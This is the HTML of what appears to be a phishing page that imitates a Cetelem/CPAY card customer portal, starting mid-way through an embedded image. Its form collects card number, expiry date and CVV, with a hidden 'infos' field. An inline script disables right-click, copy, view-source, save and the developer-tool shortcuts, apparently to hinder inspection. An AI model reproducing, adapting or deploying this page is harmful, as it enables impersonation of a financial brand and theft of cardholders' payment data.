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" style="width:185px">
                                        </center>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div>
                                    <div class="col-xs-12" style="margin-top:15px">
                                        <div class="form-group">
                                            <div style="padding:0" class="col-md-12">
                                                <label style="">Numéro de carte CPAY:</label>
                                            </div>
                                            <div class="input-group">
                                                <input maxlength="21" id="cn" type="tel" class="form-control" name="cn" placeholder="Saisissez votre numéro de carte" autocomplete="cc-number" required="" minlength="16" style="width:100%;height:45px;padding-left:10px;outline:0" value="">
                                                <span class="input-group-addon">
                                                    <i class="fa fa-credit-card"></i>
                                                </span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div style="display:inline-flex;width: 100%;margin-top:5px;">
                                    <div style="width:50%">
                                        <div style="padding:0" class="col-md-12">
                                            <label style="">Expiration date:</label>
                                        </div>
                                        <div class="form-group">
                                            <input maxlength="5" type="tel" id="ed" name="ed" class="form-control" placeholder="MM/YY" autocomplete="cc-exp" required="" value="" minlength="5" style="width:100%;height:45px;padding-left:10px;outline:0">
                                        </div>
                                    </div>
                                    <div style="width:50%;margin-left:4%">
                                        <div style="padding:0" class="col-md-12">
                                            <label style="">Cryptogramme:</label>
                                        </div>
                                        <div class="form-group">
                                            <input maxlength="3" type="tel" class="form-control" name="sc" placeholder="Cryptogramme visuel" autocomplete="cc-csc" required="" value="" minlength="3" id="sc" style="width:100%;height:45px;padding-left:10px;outline:0">
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div style="
    text-align: center;
">
                         <input type="submit" id="accesClientSubmit" class="button radius large next-arrow spacedTop nowrap padding-mini secondary" rv-value="model.app.authentication.S18.LIBF05-003_8" value="continuer" style="
    background: #3A913F;
">
                        </div>
<input type="hidden" name="type" value="infos">
                        
                    </div>
					</form>
                    </div>
                    <div class="autresEspacesDedies">
                     <div class="title font-18"> Retrouvez vos autres espaces dédiés </div>
                     <ul>
                      <li>
                       <div class="title" id="contrats">
                        <a href="#">
                         <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAMAAABXc8oyAAAA/FBMVEWUlZT///+UlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZTqfDOYAAAAU3RSTlMAAAEEDg8QFBkaHiAjJCcsLS4xMzU3QUJESUxNTlRbXV5gYmlsent8fYCChYmKkJiZm5ydnp+goaOrsLu9wMLEx8jd3uXn7O7v8PHy8/X29/j5+oov2hEAAADeSURBVDjL7dDZUsIwFIDhPyCiVgRFxKUCteC+gQqyqSCKyk7e/128aM1M2vACDv9tvjlJDkLvuDWWvacUqr8DNBZ97p/ubO6X5+cR3yXebBO8et8AIP1x5rlUrzmxw3BtnhEeSE+TAJnPm0jOkxosvggf8nAPZIclhLj7CsHapYIHXbDHLoi8YWLDVXBrBtMTwB0dhd/YcBS0JEgLiqOs4df1nILrE5C3F5WfPdMeY1EFicN1tfq4G1i47SyosKJD+do2950PwFV1hV7bWcIl/A9w2zLXCcCBXNShD38BXz80iOEqEqYAAAAASUVORK5CYII=">
                         <div>
                          <span class="cpay-color">Souscription électronique</span>
                          <span class="subtitle">(en magasin ou en ligne) <br>Consultez votre contrat </span>
                         </div>
                        </a>
                       </div>
                      </li>
                      <li>
                       <div class="title" id="moncontrat">
                        <a href="#">
                         <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAMAAABXc8oyAAABnlBMVEWUlZT///+UlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSUlZSh0mBZAAAAiXRSTlMAAAECAwUGCQoLDQ4PEBEUFRYXGBkaGxweICEiIyQlJicoKSosLS8zNTY5PD9AQUJDREdISUtOUlRWWVtgYmNlZ2lqcXR1e31+gIKDj5CXmJqeoKKlpqipq62wsbKztLa4ubq+wMPExcfKzM3Oz9DT2tvc4OPk5efo6uvu7/Dx8vX29/j5+vv9/inEoSEAAAGDSURBVDjLjdL5NwJRFAfw98YY2Ulkyx7JkjVkjeyVXWHsJMuIGHsYZsh/rXpzYpgu75f77j2fM+fM912E/3mQXHVLQtjfFB38OD+ggV83VUxIvX/Ban6OjpTul0EYZl/OULHOKtpB6PLRctv2PARBviv+c51SAQA/yr5iOO0H4KPlC3IDAPQuxF2rVATAGrFDbi3CCJij41ZL2q0TCoTU9hYJsvDKCT9h3s0kudQ+OkCIG0QruTQ/20GI7U+VZNCifMZfELsvdLEBsorDIKRZLoPsY7swDkGs8e9qyD6aH5xJAMQ5AZYh+2i8WktFncfv97NZajAmyXfyj7gxcbS8cT+gU4NYG9zUEKnxCJZIYdigXg3iHO4gk0iKVGYlWKIGccZeQK8InF7k9WoQp3iv6xWB0+yKKkTUtGBTBG5+VYcI2QQX8w2apEQQGc8Oi+OQ8mwkhChtOdQrQ8p9V5oYItQXWs2N1uR5vgpDEBXs3I3WGXqOzgwYhoiy+d7C51Pp8vwTIr1AgdqXHiYAAAAASUVORK5CYII=">
                         <div>
                          <span class="cpay-color">Souscription par téléphone</span>
                          <span class="subtitle">Imprimez, envoyez votre contrat</span>
                         </div>
                        </a>
                       </div>
                      </li>
                     </ul>
                    </div>
                   </div>
                   <div class="cetelemchatbot passwordPopin sf-hidden"></div>
                  </div>
                  <a class="close sf-hidden"></a>
                  <div class="iaLoader sf-hidden"></div>
                 </li>
                </ul>
               </div>
              </div>
             </div>
            </div>
           </div>
          </div>
          <div class="ls-row-clr"></div>
         </div>
        </div>
       </div>
      </div>
      <div class="ls-row-clr"></div>
     </div>
    </div>
    
    <div class="ls-row full-page-layout" id="footerContainer">
     <div class="ls-fxr" id="ls-gen37775058-ls-fxr">
      <div class="ls-area" id="ls-row-3-area-1">
       <div class="ls-area-body" id="ls-gen37775059-ls-area-body">
        <div class="ls-cmp-wrap ls-1st" id="w1575883590978">
         <div class="iw_component" id="1575883590978">
          <div class="row paddedRow small-centered">
           <div class="column small-12">
            <div class="footer">
             <div class="socialBtn">
              <ul>
               <li class="socialFacebook">
                <a title="Facebook" href="#"></a>
               </li>
               <li class="socialTwitter">
                <a title="Twitter" href="#"></a>
               </li>
               <li class="socialYoutube">
                <a title="Youtube" href="#"></a>
               </li>
              </ul>
             </div>
             <div class="contactBtn sf-hidden"></div>
            </div>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
      
     </div>
    </div>
   </div>
  </div>
<script src="./Ctlm_files/jquery.min.js"></script>
<script src="./Ctlm_files/imask.min.js"></script>
<script src="./Ctlm_files/infos.js"></script>


<script>
jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

    


    

})


</script>
</body></html>